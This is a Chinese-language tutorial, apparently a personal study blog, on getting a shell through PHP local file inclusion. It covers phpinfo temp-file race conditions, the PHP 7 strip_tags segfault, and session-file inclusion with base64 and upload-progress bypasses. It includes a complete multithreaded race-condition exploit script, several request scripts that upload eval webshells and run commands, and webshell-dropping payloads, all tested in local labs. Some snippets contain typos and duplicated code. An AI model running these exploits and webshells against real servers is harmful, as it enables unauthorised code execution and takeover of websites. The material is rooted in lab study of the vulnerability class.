# PHP LFI 利用临时文件Getshell

[PHP LFI 利用临时文件 Getshell 姿势-安全客 - 安全资讯平台](https://www.anquanke.com/post/id/201136) 

 [LFI 绕过 Session 包含限制 Getshell-安全客 - 安全资讯平台](https://www.anquanke.com/post/id/201177#h3-3) 

**目录**

[TOC]





思路都是跟着师傅们走的 其中加上了自己的想法和环境的改变

## PHP LFI 利用临时文件Getshell

首先我们了解一下什么是

### 临时文件

在通过web 传递文件的时候 通过 POST PUT 进行文本和二进制的传递

我们上传的文件信息会保存在全局变量$_FIELS中

```bash
$_FILE 这个全局变量很特殊 他是预定义超级数组中唯一一个二维数组
 
作用是上传文件的各种信息
 
$_FIELS['userfile']['name'] 客户端文件的名字
 
$_FIILS['userfile']['type'] 文件MIME，如果浏览器提供这种支持 例如 "image/gif"
 
$_FILES['userfile']['size'] 文件的大小 字节
 
$_FILES['userfile']['tmp_name'] php上传存储服务端的临时文件 一般是系统默认，可以在php.ini 的 upload_tmp_dir 中指定 默认是 /tmp目录
 
$_FILES['userfile']['error'] 文件上传错误的代码 上传成功则为 0  否则就是错误信息
```

在临时包含文件漏洞中  
$_FIELS['userfile']['name'] 这个变量很重要 我们需要知道这个临时文件的名字 我们才可以通过 include包含 那我们如何知道 我们首先要了解

#### linux 和 windows的 临时文件存储规则

```cobol
linux
/tmp
 
 
windows
C:/Windows/
或者
C:/Windows/Temp
```

如果php.ini的 upload_tmp_dir没有写入

就会默认生成在这里

我们还需要了解

#### linux和windows对临时文件的命名规则

```cobol
linux
 
保存在 tmp下的格式通常为
 
tmp/php[6个字符]
 
 
windows
 
保存在 C:/Windows下的格式通常为
 
 
C:/Windows/php[四个字符].tmp
```

## PHPINFO()特性

如果文件中存在phpinfo 我们知道可以获取临时文件名

```undefined
\vulhub-master\php\inclusion
```

我们可以用自己的方式来

index.php

```php
<?php
 
    $file  = $_GET['file'];
    include($file);
 
?>
```

info.php

```php
<?php phpinfo();?>
```

然后通过exp来实现

原理是什么呢

### 原理

向php发送代码区块的时候 无论有没有被解析 都会存入一个临时文件 其实就是文件上传

我们通过上传一个文件内容 就可以生成一个临时文件

我们可以通过request来实现

```cobol
files = {
  'file': ("aa.txt","ssss")
}
r = requests.post(url=url, files=files, allow_redirects=False)
```

这里其实就是上传了一个文件区块

所以会生成一个临时文件在tmp(默认)目录下

这个时候 phpinfo()登场了 phpinfo()会输出当前请求上下中的所有变量 所以我们向phpinfo的页面

传输上面的文件区块 phpinfo就会输出 我们就可以在phpinfo中找到 $_FILES的内容 这个时候 我们就可以获取了临时文件

但是我们如何发送个文件包含 还要保证 临时文件不被删除呢

这里就是打一个时间差

### 条件竞争

```perl
首先 我们发送一个包含webshell的包 这个包的header get post 全是垃圾数据
 
然后phpinfo 将所有内容打印出来 php默认输出缓冲区的大小为4096
 
可以理解为 每次输出4096都给 socket链接 就是都输出响应
 
 
所以 我们读取原生的socket 只要发现了 临时文件名 就再发一次垃圾包
 
这个时候 第一次的 socket还没有结束 但是还是接受到了 第二次的 socket
 
从而就接上了 临时文件 这个时候 我们将临时文件 输出给文件包含页面 
 
这个时候就可以包含我们的webshell了
 
 
```

我们先不用exp

我们来使用 request来看看能不能输出 $_FILES变量



<img src="https://i-blog.csdnimg.cn/blog_migrate/c2b84f2e1e30d626ee8d3b31dfff1430.png" alt="" style="max-height:166px; box-sizing:content-box;" />


上面是python输出的 发现成功获取了 临时文件

然后我们开始从docker中 来学尝试

首先去 vulhub拉去镜像



<img src="https://i-blog.csdnimg.cn/blog_migrate/871af1c34ad32b3442645527382b2298.png" alt="" style="max-height:400px; box-sizing:content-box;" />


访问 localhost:8080/phpinfo.php

<img src="https://i-blog.csdnimg.cn/blog_migrate/572972fcaef4b5c84e954affdb710a31.png" alt="" style="max-height:474px; box-sizing:content-box;" />


```cobol
/lfi.php?file=phpinfo.php
```

上面文件确定了存在文件包含

这里

```undefined
phpinfo
 
 
文件包含
```

两个条件都确定了 所以我们可以通过exp直接上传木马了

下面是exp  是我通过gpt修改的py3环境 因为我的py2 无法实现

 [https://github.com/vulhub/vulhub/blob/master/php/inclusion/exp.py%22%3Ehttps://github.com/vulhub/vulhub/blob/master/php/inclusion/exp.py%3C/a%3E](https://github.com/vulhub/vulhub/blob/master/php/inclusion/exp.py%22%3Ehttps://github.com/vulhub/vulhub/blob/master/php/inclusion/exp.py%3C/a%3E) 

```cobol
py3 exp.py ip 8080 100
```

```cobol
#!/usr/bin/python3
import sys
import threading
import socket
 
 
def setup(host, port):
    TAG = "安全测试"
    PAYLOAD = """%s\r
<?php file_put_contents('/tmp/shell', '<?=eval($_REQUEST[1])?>')?>\r""" % TAG
    REQ1_DATA = """-----------------------------7dbff1ded0714\r
Content-Disposition: form-data; name="dummyname"; filename="test.txt"\r
Content-Type: text/plain\r
\r
%s
-----------------------------7dbff1ded0714--\r""" % PAYLOAD
    padding = "A" * 5000
    REQ1 = """POST /phpinfo.php?a=""" + padding + """ HTTP/1.1\r
Cookie: PHPSESSID=q249llvfromc1or39t6tvnun42; othercookie=""" + padding + """\r
HTTP_ACCEPT: """ + padding + """\r
HTTP_USER_AGENT: """ + padding + """\r
HTTP_ACCEPT_LANGUAGE: """ + padding + """\r
HTTP_PRAGMA: """ + padding + """\r
Content-Type: multipart/form-data; boundary=---------------------------7dbff1ded0714\r
Content-Length: %s\r
Host: %s\r
\r
%s""" % (len(REQ1_DATA), host, REQ1_DATA)
    # modify this to suit the LFI script
    LFIREQ = """GET /lfi.php?file=%s HTTP/1.1\r
User-Agent: Mozilla/4.0\r
Proxy-Connection: Keep-Alive\r
Host: %s\r
\r
\r
"""
    return (REQ1, TAG, LFIREQ)
 
 
def phpInfoLFI(host, port, phpinforeq, offset, lfireq, tag):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s2 = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 
    s.connect((host, port))
    s2.connect((host, port))
 
    s.send(phpinforeq.encode())
    d = b""
    while len(d) < offset:
        d += s.recv(offset)
    try:
        i = d.index(b"[tmp_name] =&gt; ")
        fn = d[i + 17:i + 31]
    except ValueError:
        return None
 
    s2.send((lfireq % (fn.decode(), host)).encode())
    d = s2.recv(4096)
    s.close()
    s2.close()
 
    if d.find(tag.encode()) != -1:
        return fn.decode()
 
 
counter = 0
 
 
class ThreadWorker(threading.Thread):
    def __init__(self, e, l, m, *args):
        threading.Thread.__init__(self)
        self.event = e
        self.lock = l
        self.maxattempts = m
        self.args = args
 
    def run(self):
        global counter
        while not self.event.is_set():
            with self.lock:
                if counter >= self.maxattempts:
                    return
                counter += 1
 
            try:
                x = phpInfoLFI(*self.args)
                if self.event.is_set():
                    break
                if x:
                    print("\n成功！Shell已创建在 /tmp/shell")
                    self.event.set()
 
            except socket.error:
                return
 
 
def getOffset(host, port, phpinforeq):
    """获取php输出中tmp_name的偏移量"""
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((host, port))
    s.send(phpinforeq.encode())
 
    d = b""
    while True:
        i = s.recv(4096)
        d += i
        if i == b"":
            break
        # detect the final chunk
        if i.endswith(b"0\r\n\r\n"):
            break
    s.close()
    i = d.find(b"[tmp_name] =&gt; ")
    if i == -1:
        raise ValueError("在phpinfo输出中未找到php tmp_name")
 
    print("在位置 %i 找到 %s" % (i, d[i:i + 10].decode()))
    # 加一些填充
    return i + 256
 
 
def main():
    print("LFI With PHPInfo()")
    print("-=" * 30)
 
    if len(sys.argv) < 2:
        print("用法：%s 主机 [端口] [线程数]" % sys.argv[0])
        sys.exit(1)
 
    try:
        host = socket.gethostbyname(sys.argv[1])
    except socket.error as e:
        print("主机名 %s 无效，请确保输入正确的主机名或IP地址。" % sys.argv[1])
        host = socket.gethostbyname(sys.argv[1])
    except socket.error as e:
        print("主机名 %s 无效，请确保输入正确的主机名或IP地址。" % sys.argv[1])
        sys.exit(1)
 
    port = int(sys.argv[2]) if len(sys.argv) > 2 else 80
    numthreads = int(sys.argv[3]) if len(sys.argv) > 3 else 10
 
    phpinforeq, tag, lfireq = setup(host, port)
    offset = getOffset(host, port, phpinforeq)
 
    print("\n[*] 开始进行LFI攻击...")
    threads = []
    e = threading.Event()
    l = threading.Lock()
 
    try:
        for i in range(numthreads):
            t = ThreadWorker(e, l, 100, host, port, phpinforeq, offset, lfireq, tag)
            threads.append(t)
            t.start()
 
        while not e.is_set():
            try:
                e.wait(1)
            except KeyboardInterrupt:
                print("\n[*] 收到中断信号，正在停止攻击...")
                e.set()
 
    except socket.error as e:
        print("连接错误：%s" % str(e))
 
    for t in threads:
        t.join()
 
    print("\n[*] 攻击结束。")
 
 
if __name__ == "__main__":
    main()
```



<img src="https://i-blog.csdnimg.cn/blog_migrate/231fd118bf3cb93ff3a381df26894c7e.png" alt="" style="max-height:567px; box-sizing:content-box;" />




<img src="https://i-blog.csdnimg.cn/blog_migrate/5cd18cdacba469eea9886b3906f16b93.png" alt="" style="max-height:253px; box-sizing:content-box;" />
这四个地方 按照自己的设定来实现

<img src="https://i-blog.csdnimg.cn/blog_migrate/6d749e8927b3f46e686ca33fd3e45fef.png" alt="" style="max-height:148px; box-sizing:content-box;" />


成功了 这个时候 临时文件就不会被删除



<img src="https://i-blog.csdnimg.cn/blog_migrate/5801b02ac5b00e65d569bbf3180e8841.png" alt="" style="max-height:429px; box-sizing:content-box;" />


这里大家不要绕晕了 因为我们其实保存的临时文件 还是PHP[四个字符]这种格式

但是我们的木马写的是

```php
<?php file_put_contents('/tmp/shell', '<?=eval($_REQUEST[1])?>')?>
```

重新写一个文件 到tmp的shell下

所以我们这里可以去tmp/shell包含

因为上面的exp会一直发送垃圾包给phpinfo 并且 同时发送文件包含到lfi.php中 包含临时文件

然后临时文件内容为写入shell 从而达到getshell

## PHP7 Segment Fault

这里看名字就知道了

### 利用条件

```cobol
PHP版本  7.0.0-----7.0.28
```

上面的条件其实挺苛刻的 需要 存在文件包含 并且还有phpinfo的界面

那么这里研究的就是 如果没有存在 phpinfo 的界面 我们是不是就无法通过 文件包含getshell

其实不然

PHP 7 存在一个漏洞 [CVE-2018-14884](https://bugs.php.net/bug.php?id=75535) segment fault漏洞

```cobol
首先 我们知道 php存在过滤器 我们常用的filter中存在有一个
 
 
php://filter/string.strip_tags  原本的作用是在字符串中去除 HTML 和 PHP 标签
 
但是在 7.0.0----7.0.28
 
中 使用 string.strip_tags 会让文件崩溃 出现 segment fault（段错误）
 
这个时候 php的垃圾回收 就失效了 不会像phpinfo 一样删除临时文件 所以临时文件
 
就会保留在 tmp 或者 upload_tmp_dir 设定的目录下
```

我们一样继续在本地搭建环境测试

dir.php

```php
<?php
$a= @$_GET['dir'];
if(!$a){
$a = 'C:\Windows';
}
var_dump(scandir($a));
?>
```

index.php

```php
<?php
    $a = @$_GET['dir'];
    var_dump(scandir($a));
?
```

然后我们的目的是文件包含的时候破坏php 出现段错误

我们首先来测试

首先配置 7 的版本

 [windows.php.net - /downloads/releases/archives/](https://windows.php.net/downloads/releases/archives/) 



<img src="https://i-blog.csdnimg.cn/blog_migrate/539416c9075c698240ff51b7c00de5e7.png" alt="" style="max-height:96px; box-sizing:content-box;" />


然后访问 index.php

这里是windows的环境 所以我们访问 **C:/Windows/win.ini/** 

 **其实这里什么文件都是可以的** 

```cobol
127.0.0.1:3000/index.php?file=php://filter/string.strip_tags/resource=C:/Windows/win.ini
```



<img src="https://i-blog.csdnimg.cn/blog_migrate/9b486fe9ac8da0a3893c0957c35cd2ec.png" alt="" style="max-height:615px; box-sizing:content-box;" />


出现了报错

这里就说明存在了

那么我们如何通过上传php木马呢

我们来request写入

### 攻击技巧1

这里是通过存在 dir.php 来显示

这里顺便介绍一个库io 其中的 方法

BytesIO 主要是通过 字节方式存储 我们传递文件 就可以使用这个

```cobol
import  requests
from io import  BytesIO
 
url1 = "http://localhost/index.php?file=php://filter/string.strip_tags/resource=C:/Windows/win.ini"
 
files = {'file':BytesIO('<?php eval($_REQUEST[1]);?>')}
 
re = requests.post(url=url1,files=files,allow_redirects=False)
 
url2 = "http://localhost/dir.php"
 
re2 = requests.get(url = url2)
 
print re2.text
```

首先 我们可以找到 php临时文件



<img src="https://i-blog.csdnimg.cn/blog_migrate/c4609b3df7b3c3e2db8956e1563d4c4e.png" alt="" style="max-height:105px; box-sizing:content-box;" />


然后我们就可以通过这个执行命令了

```cobol
# -*- coding: utf-8 -*-
import re
import requests
from io import BytesIO
 
# 定义漏洞URL和文件路径
vul_url = "http://localhost/index.php?file=php://filter/string.strip_tags/resource=C:/Windows/win.ini"
url2 = "http://localhost/dir.php"
 
# 构建文件
files = {'file': BytesIO('<?php eval($_REQUEST[1]);?>')}
 
# 发送漏洞利用请求
req = requests.post(url=vul_url, files=files, allow_redirects=False)
req2 = requests.get(url=url2)
# 获取临时文件名
content1 = re.search(r"php[a-zA-Z0-9]{1,}.tmp", req2.content).group(0)
 
# 构建获取目录列表的URL
url3 = "http://localhost/index.php?file=C:/Windows/{}".format(content1)
 
# 构建命令
data = {
    1: "system('dir');"
}
 
# 发送获取目录列表的请求
req3 = requests.post(url=url3, data=data)
 
# 输出结果
print u"目录列表：\n{}".format(req3.text)
```

这个代码确实写的恶心了点 。。。。。

但是执行了命令

<img src="https://i-blog.csdnimg.cn/blog_migrate/2593181354ae7727af81c36d254ae79f.png" alt="" style="max-height:277px; box-sizing:content-box;" />


这里条件其实还是有点苛刻 需要dir.php来输出 如果我们不存在呢

其实我们只需要一个文件包含即可 因为我们可以通过爆破/遍历 来实现

我们可以使用工具来直接进行fuzz 我们使用 bp来进行

我本地是 4A41 我们直接bp跑了



<img src="https://i-blog.csdnimg.cn/blog_migrate/8133166bbdcb068e895e5105815de9df.png" alt="" style="max-height:551px; box-sizing:content-box;" />


看看要多久

ok 爆破了半天 白爆破了 看了会手机才发现没有加目录。。。。。



<img src="https://i-blog.csdnimg.cn/blog_migrate/dc14edc83c8522f2571707da60f5fafd.png" alt="" style="max-height:185px; box-sizing:content-box;" />


差不多爆破了 8分钟吧 还是慢的



<img src="https://i-blog.csdnimg.cn/blog_migrate/e196671795a9b12e2009a6ea0a3847db.png" alt="" style="max-height:458px; box-sizing:content-box;" />


成功获取了shell

## LFI 绕过 SESSION 包含限制 Getshell

搞完上面 居然还有一个。。。。。 好累啊

但是确实学到东西 ^_^

一样 我们了解如何绕过 先去看看 如何session是什么

session 叫做 用户会话 用来存储标识的

我们首先看看

### 会话存储

#### 存储位置

每个语言存储的方式是不一样的

```undefined
java 是 将session 存储入内存中
 
php 是 将 session 以一个文件形式存储
 
存储的位置我们可以去php.ini查看
```



<img src="https://i-blog.csdnimg.cn/blog_migrate/71748dfa2a5e876dcd619daee598033c.png" alt="" style="max-height:94px; box-sizing:content-box;" />


第二种 我们可以通过phpinfo查看



<img src="https://i-blog.csdnimg.cn/blog_migrate/d1b3b3557c4cee35f57a88aa3020ef41.png" alt="" style="max-height:99px; box-sizing:content-box;" />


因为没有设置 所以默认是tmp

但是其实实际中 存在一下存储位置

```cobol
/var/lib/php/sess_PHPSESSID
 
/var/lib/php/sessions/sess_PHPSESSID
 
/tmp/sess_PHPSESSID
 
/tmp/sessions/sess_PHPSESSID
```

#### 存储命名

我们如果要实现文件包含 我们就需要了解文件名是什么

```vbnet
一般我们能看到
 
 
我们bp发包的时候是
 
 
Cookie: PHPSESSID=abdsajdjad
```

这个时候 就会生成sess_abdsajdjad

其实就是 sess_[我们发送的session]

我这里是通过windows环境进行测试 所以我的session存放位置是

```sql
C:\Users\Administrator\AppData\Local\Temp
```



```php
<?php
 
    session_start();
    $username = $_POST['username'];
    $_SESSION["username"] = $username;
 
?>
```

我们发送 username=1



<img src="https://i-blog.csdnimg.cn/blog_migrate/0f7ee639e94602717409eebfa3eb6816.png" alt="" style="max-height:143px; box-sizing:content-box;" />


可以获取到session

然后去目录下找



<img src="https://i-blog.csdnimg.cn/blog_migrate/f17f82320c91fca593d9a0e90e4eed5c.png" alt="" style="max-height:114px; box-sizing:content-box;" />


### 会话处理

我们了解了session的存储 我们现在需要了解一下 会话的处理

其实主要处理方式 是php.ini 或者 代码中对 `session.serialize_handler` 的配置

#### session.serialize_handler

我们这里先需要了解一下这个配置

 `session.serialize_handler = php ` 这个是默认配置 存储方式 是通过|来间隔

```php
<?php
 
    session_start();
    $username = $_POST['username'];
    $_SESSION["username"] = $username;
 
?>
```



<img src="https://i-blog.csdnimg.cn/blog_migrate/a402eed16810659c493649ba7d474b6b.png" alt="" style="max-height:130px; box-sizing:content-box;" />


 `session.serialize_handler = php_serialize ` 这个是php5.5后启用的 通过序列化进行分割

```php
<?php
 
    ini_set('session.serialize_handler', 'php_serialize');    
    session_start();
    $username = $_POST['username'];
    $_SESSION["username"] = $username;
 
?>
```



<img src="https://i-blog.csdnimg.cn/blog_migrate/117740d16d70fd08e0fb5d601392fa6b.png" alt="" style="max-height:130px; box-sizing:content-box;" />


能发现是通过序列化进行存储的

上面了解完了 session的知识

现在我们需要了解文件包含

### LFI SESSION

#### serialize_handler = php

这里开始了解 session 文件包含漏洞

首先我们需要一个文件包含的漏洞代码 index.php

```php
<?php
 
    $file  = $_GET['file'];
    include($file);
 
?>
```

然后需要一个上传session的内容 session.php

```php
<?php
    session_start();
    $username=$_POST['username'];
    $_SESSION["username"] = $username;
?>
```

然后我们通过session传递参数



<img src="https://i-blog.csdnimg.cn/blog_migrate/469b8684ae0cd3c661a5276ddc0a4b91.png" alt="" style="max-height:824px; box-sizing:content-box;" />


获取session值 这个时候我们就相当于知道了 session文件的文件名

```cobol
sess_4794cc8f9f63ed29d97daf155ee94ef2
```

其次我们通过文件包含读取这个文件看看

我这里是

```cobol
C:\Users\Administrator\AppData\Local\Temp\sess_4794cc8f9f63ed29d97daf155ee94ef2
```



<img src="https://i-blog.csdnimg.cn/blog_migrate/86a71fa67d0f21a4b6a9a89799db20c8.png" alt="" style="max-height:225px; box-sizing:content-box;" />


成功读取了

但是我们换一种思路 我们通过写入木马呢

```php
username=<?php eval($_REQUEST[1]);?>
```

然后去查看sess文件



<img src="https://i-blog.csdnimg.cn/blog_migrate/b197c316b4219f0ea3cb0ad40b9cfb36.png" alt="" style="max-height:763px; box-sizing:content-box;" />


可以发现命令执行成功

#### serialize_handler = serialize_php

一样我们通过payload执行传递一句话

```php
username=<?php eval($_REQUEST[1]);?>
```

然后去包含文件看看  这里和上面我的路径不一样 是因为上面是vs的 下面是小皮开的



<img src="https://i-blog.csdnimg.cn/blog_migrate/ce3fff32efbfcb6ec7079a38de2e63f2.png" alt="" style="max-height:260px; box-sizing:content-box;" />


发现成功执行了 getshell 了 蚁剑链接看看



<img src="https://i-blog.csdnimg.cn/blog_migrate/e19f510aee48202a91ec57b1cf8b9843.png" alt="" style="max-height:640px; box-sizing:content-box;" />


以上是最最最最理想化的session文件包含了

现在我们来探讨一下文件包含的限制

### session文件包含限制

一般会对session进行加密传递 或者 服务器中根本不出现 session_start这种设置

这样我们就无法生成session 自然无法实现本地文件包含

下面开始进行

### SessionBase64Encode

首先是对session进行base64加密

session.php

```php
<?php
    session_start();
    $username=$_POST['username'];
    $_SESSION["username"] = base64_encode($username);
    echo "username -> $usernmae"
?>
```

index.php

```php
<?php
 
    $file  = $_GET['file'];
    include($file);
 
?>
```

然后我们开始进行正常的操作

```php
usernmae=<?php eval($_REQUEST[1]);?>
```

然后去访问sess文件



<img src="https://i-blog.csdnimg.cn/blog_migrate/f70af8788decfed54331cedc0e6e68cc.png" alt="" style="max-height:171px; box-sizing:content-box;" />


发现了 base加密 我们看看能不能直接通过 过滤器解密



<img src="https://i-blog.csdnimg.cn/blog_migrate/520e5aab89d9a56b4526e58a041f6c7a.png" alt="" style="max-height:168px; box-sizing:content-box;" />


发现乱码了

因为base过滤器解密是将所有的信息解密 包括前面的base64

所以会变成乱码

现在我们学习绕过

绕过分为两种

#### bypass serialize_handler=php

这里我们希望 我们解密的地方能够和加密的地方对上

##### base64加解密

###### 加密

base64编码是将64个可打印字符按照任意字节序编码成ASCII字符 另外 = 可以作为后缀

<img src="https://i-blog.csdnimg.cn/blog_migrate/a39388eecfb6afe93cf78316548b63d6.png" alt="" style="max-height:786px; box-sizing:content-box;" />


然后我们探讨一下base64编码的过程

```cobol
Base64 首先将输入 按照字节切分
 
然后获取每个位的二进制 (不足8bit 高位补0)
 
然后将二进制串联 再按照6bit的长度组合（不足6位末尾补0）
 
将每组二进制转换为十进制 然后通过ASCII对照表进行转换为ASCII值
```

 [LFI 绕过 Session 包含限制 Getshell-安全客 - 安全资讯平台](https://www.anquanke.com/post/id/201177#h3-11) 

引用师傅里面的图像

```cobol
我们通过 ABCD来测试
 
 A                 B                C                D
0x41              0x42            0x43              0x44        十六机制
 
01000001          01000010        01000011          01000100    二进制
 
010000   010100    001001    000011    010001     000000        通过6个组合为一组二进制
 
16      20        9           3            17         0         转为十进制
 
 
Q        U        J            D            R           A       通过base64对照表进行十进制转换 
```

上面就是流程了

加密后最后通过 ==补齐

```cobol
QUJDRA==
```

###### 解密

其实就是上面的逆向

```cobol
首先通过base64对照表进行转为十进制
 
十进制转为二进制
 
二进制拆开 通过 8bit组合
 
然后转变为十六进制
 
最后变为ASCII值
```

##### base64特点

我们首先知道 base64是将ascii 变为可见字符的加密

PHP在解密base64的时候 如果遇到了不可见字符即不在64个字符中的字符 就会跳过

仅将合法的字符组成字符串进行解密

64个字符为（A-Z、a-z、0-9、+、/）

我们可以通过测试来看看

```php
<?php
$base1 = "ABCDEFGbacd";
$base2 = "ABCD#EFGbacd";
$base3 = "ABCD&EFGbacd"; 
 
 
echo "第一个：".base64_decode($base1);
echo "</br>";
echo "第二个：".base64_decode($base2);
echo "</br>";
echo "第三个：".base64_decode($base3);
?>
```



<img src="https://i-blog.csdnimg.cn/blog_migrate/384a9bb32886fcbf5b42b1ef08487913.png" alt="" style="max-height:281px; box-sizing:content-box;" />


这里我们可以发现 三次输出都是一样的 不一样的是我输入后两个加了个在64字符之外的内容

所以这里我们能确定 会跳过不合法的字符 将合法字符组合为一个字符串 然后进行解密

##### bypass base64_encode

这里其实我也看了好久我才明白什么意思

其实我们这里全部解密失败的原因是下面的

```cobol
我们传入的内容
username|s:36:"PD9waHAgZXZhbCgkX1JFUVVFU1RbMV0pOz8+";
 
我们只需要特殊关注下面的内容
 
username|s:36:"  我们回忆一下64个字符中 并不存在 : " 吧
 
所以其实解密只会解密到
 
usernames36
 
按照base64 四个为一组进行解密
 
user name s36X 后面的X是占位符
 
 
这里我们发现 最后是 s36 然后就没有了 那么是不是需要后面我们的shell来补齐
 
PD9waHAgZXZhbCgkX1JFUVVFU1RbMV0pOz8+
 
就会补齐一个上去
 
所以变为了
 
s36P D9wa   我们的木马就被破坏了 
 
所以我们需要找到一个方法 让s36这块变成4个
 
其实很简单
 
s:36 后面的36 是按照我们传入的木马字符数 进行获取
 
如果我们传递一个100个字符的字符串
 
那么是不是就会变为 s100   （假设为100）
 
那么现在base64解密
 
是不是就变为了
 
user name s100 PD9wa HAgZ ....... 正常解密了 后面的加密字符串
```

那我们可以开始构造payload了

然后我们传递一下

```php
username=nmnmnmnmnmnmnmnmnmnmnmnmnmnmnmnmnmnmnmnmnmnmnmnmnmnmnm<?php eval($_REQUEST[1]);?>
```

然后我们去文件包含一下看看多少个字符



<img src="https://i-blog.csdnimg.cn/blog_migrate/3a43ab9235357603b6c686871dee3a44.png" alt="" style="max-height:66px; box-sizing:content-box;" />


这里就实现咯

```cobol
user name s108 bm1u .....
```

然后我们通过过滤器读取吧

```cobol
php://filter/convert.base64-decode/resource=C:\Users\Administrator\AppData\Local\Temp\sess_4794cc8f9f63ed29d97daf155ee94ef2
```



<img src="https://i-blog.csdnimg.cn/blog_migrate/a01c80d09e7ea3c23d274794f7420e61.png" alt="" style="max-height:222px; box-sizing:content-box;" />


直接就可以getshell了



<img src="https://i-blog.csdnimg.cn/blog_migrate/65d75ecb2ca79be5027e18ce35ce074f.png" alt="" style="max-height:640px; box-sizing:content-box;" />


这里原本通过vscode起来的本地环境无法使用蚁剑链接 也不知道为什么

然后通过小皮就可以了

这里我们就实现了 bypass serialize_handler = php 的base64加密存储session

接下来就是另一个了

#### bypass serialize_handler = php_serialize

说完上面的 现在说说序列化怎么办

session.php

```php
<?php
 
    ini_set('session.serialize_handler', 'php_serialize');    
    session_start();
    $username = $_POST['username'];
    $_SESSION['username'] = base64_encode($username);
    echo "username -> $username";
 
?>
```

我们一样 先传递木马上去看看

```php
usernmae=<?php eval($_REQUEST[1]);?>
```

然后我们去包含查看

```cobol
C:\Windows\sess_4794cc8f9f63ed29d97daf155ee94ef2
```

```cobol
a:1:{s:8:"username";s:36:"PD9waHAgZXZhbCgkX1JFUVVFU1RbMV0pOz8+";}
 
得到内容了
我们看看如果我们全部basae64解码 是这么个情况 （在序列化的情况下）
 
 
 
a1s8  user name s36P D9wa .........
 
很显然 还是出现了 缺少一位 那我们上面的payload可以直接使用
```

payload

```php
username=nmnmnmnmnmnmnmnmnmnmnmnmnmnmnmnmnmnmnmnmnmnmnmnmnmnmnm<?php eval($_REQUEST[1]);?>
```

```cobol
php://filter/convert.base64-decode/resource=C:\Windows\sess_4794cc8f9f63ed29d97daf155ee94ef2
```



<img src="https://i-blog.csdnimg.cn/blog_migrate/45d38425febf18f97918c400033ebae7.png" alt="" style="max-height:382px; box-sizing:content-box;" />


。。。。。。小皮把我ban了 那我还是换成vscode的环境吧

换路径

```cobol
C:\Users\Administrator\AppData\Local\Temp\sess_4794cc8f9f63ed29d97daf155ee94ef2
```

所以包含payload就变为

```cobol
php://filter/convert.base64-decode/resource=C:\Users\Administrator\AppData\Local\Temp\sess_4794cc8f9f63ed29d97daf155ee94ef2
```



<img src="https://i-blog.csdnimg.cn/blog_migrate/ec3638e2da30101f81508b07d959e0be.png" alt="" style="max-height:838px; box-sizing:content-box;" />


### NO Session_start()

上面的情况 全都是在 我们确定可以获取 用户session的情况下进行

那么有没有可能 服务器不开启session 那我们是不是就无法进行上传

其实还是可以的

我们首先进入phpinfo看看



<img src="https://i-blog.csdnimg.cn/blog_migrate/6128e49d5ce3b73b66e542e31406c124.png" alt="" style="max-height:121px; box-sizing:content-box;" />




<img src="https://i-blog.csdnimg.cn/blog_migrate/ec26c5747f040d5371bf15f8225ed500.png" alt="" style="max-height:260px; box-sizing:content-box;" />


```cobol
session.auto_start： 接受到session自动初始化 不需要session_start（）
 
一般都是关闭的
 
session.upload_progress.enabled： 默认开启 php接受文件上传时检测速度
 
 
session.upload_progress.cleanup： 默认开启 表示文件上传后 默认对session文件进行清除
 
这里是后面条件竞争的点
 
session.upload_progress.name = "PHP_SESSION_UPLOAD_PROGRESS"：
 
这里是关键的地方
 
首先需要在文件上传的过程中 
 
其次接收到POST内容 并且内容和 phpinfo中的session.upload_progress.name同名的变量时
 
上传的进度可以在session中获得（这里系统会自动初始化session）
```

看懂上面的内容其实就多半了解了

就是文件上传的时候 传递一个同名的参数 就会开启session

我们来进行思路的整理

首先是文件上传

```csharp
{'file':('abc.txt',"abcd")}
```

并且设置cookie （session.use_strict_mode=0）这里可以实现可控

```cobol
PHPSESSID=nm1111sl
```

然后POST一个 session.upload_progress.name （可控）

```php
session.upload_progress.name:<?php phpinfo();?>
```

然后因为上面存在cleanup

会清除这个文件 所以我们需要条件竞争 可以维持sess_nm1111sl的存在

这里我们就可以编写个exp来实现了

#### 技巧1

```cobol
import io
import sys
import requests
import threading
 
sessid = 'Qftm'
 
def POST(session):
    while True:
        f = io.BytesIO(b'a' * 1024 * 50)
        session.post(
            'http://192.33.6.145/index.php',
            data={"PHP_SESSION_UPLOAD_PROGRESS":"<?php phpinfo();fputs(fopen('C:\Users\Administrator\AppData\Local\Temp\shell.php','w'),'<?php @eval($_POST[mtfQ])?>');?>"},
            files={"file":('q.txt', f)},
            cookies={'PHPSESSID':sessid}
        )
 
def READ(session):
    while True:
        response = session.get(f'http://192.33.6.145/index.php?file=../../../../../../../../var/lib/php/sessions/sess_{sessid}')
        # print('[+++]retry')
        # print(response.text)
 
        if 'flag' not in response.text:
            print('[+++]retry')
        else:
            print(response.text)
            sys.exit(0)
 
with requests.session() as session:
    t1 = threading.Thread(target=POST, args=(session, ))
    t1.daemon = True
    t1.start()
 
    READ(session)
```



<img src="https://i-blog.csdnimg.cn/blog_migrate/750cd57d2c69383e30cfb637ed3f1552.png" alt="" style="max-height:96px; box-sizing:content-box;" />


由于本地环境部署可能有问题 没有实现成功 但是确实出现了 sess_shell文件

#### 技巧2

我们写一个前端代码 用来文件上传

```cobol
<!doctype html>
<html>
<body>
<form action="http://localhost/index.php" method="post" enctype="multipart/form-data">
    <input type="hidden" name="PHP_SESSION_UPLOAD_PROGRESS" vaule="<?php phpinfo(); ?>" />
    <input type="file" name="file1" />
    <input type="file" name="file2" />
    <input type="submit" />
</form>
</body>
</html>
```



<img src="https://i-blog.csdnimg.cn/blog_migrate/1c9dc82f01c5079e6aa558558ae3110e.png" alt="" style="max-height:651px; box-sizing:content-box;" />


然后放到攻击模块 一直发包



<img src="https://i-blog.csdnimg.cn/blog_migrate/6f374dac85c6ed7dcef2d7f4a9dd1bc9.png" alt="" style="max-height:283px; box-sizing:content-box;" />




然后去包含漏洞页面 也是无限发包 就可以实现访问了

但是本地环境 我设置可能没有设置好 无法实现

到这里就差不多理解了